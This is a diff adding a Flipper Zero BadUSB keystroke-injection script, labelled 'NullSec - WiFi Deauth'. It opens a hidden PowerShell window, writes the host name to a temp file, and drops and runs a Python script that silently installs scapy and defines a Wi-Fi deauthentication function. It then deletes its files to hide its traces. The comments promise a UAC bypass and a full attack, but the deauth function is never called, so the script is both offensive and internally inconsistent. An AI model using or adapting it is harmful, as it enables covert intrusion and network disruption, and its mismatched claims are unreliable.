@@ -1,0 +1,53 @@
+REM NullSec - WiFi Deauth via Flipper BadUSB
+REM Triggers deauth attack using built-in tools
+REM Creates temporary Python script for advanced attack
+
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 1000
+
+REM Check for admin and UAC bypass
+STRING $env:COMPUTERNAME | Out-File $env:TEMP\n01d.txt
+ENTER
+DELAY 200
+
+REM Install scapy if needed and run deauth
+STRING $code = @'
+import subprocess
+import sys
+try:
+    from scapy.all import *
+except:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "scapy", "-q"])
+    from scapy.all import *
+
+def deauth_attack(target_mac, gateway_mac, iface, count=100):
+    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
+    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+    sendp(packet, inter=0.1, count=count, iface=iface, verbose=0)
+
+# Get wireless interfaces
+import os
+result = os.popen('netsh wlan show interfaces').read()
+print(result)
+'@
+ENTER
+DELAY 200
+
+STRING $code | Out-File $env:TEMP\deauth.py -Encoding UTF8
+ENTER
+DELAY 200
+
+STRING python $env:TEMP\deauth.py
+ENTER
+DELAY 3000
+
+REM Cleanup
+STRING Remove-Item $env:TEMP\deauth.py -Force 2>$null
+ENTER
+STRING Remove-Item $env:TEMP\n01d.txt -Force 2>$null
+ENTER
+STRING exit
+ENTER
